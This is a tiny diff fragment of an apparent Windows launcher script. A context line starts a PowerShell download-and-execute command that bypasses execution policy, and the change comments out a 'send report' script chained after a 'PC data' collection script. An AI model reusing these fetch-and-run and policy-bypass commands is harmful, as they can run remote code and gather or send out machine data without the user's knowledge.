@@ -45,4 +45,4 @@ powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).Down
 
 
 
-powershell -ExecutionPolicy Bypass -File "%USERPROFILE%\DatosPc.ps1" && powershell -ExecutionPolicy Bypass -File "%USERPROFILE%\EnviarReporte.ps1"
+powershell -ExecutionPolicy Bypass -File "%USERPROFILE%\DatosPc.ps1" # powershell -ExecutionPolicy Bypass -File "%USERPROFILE%\EnviarReporte.ps1"
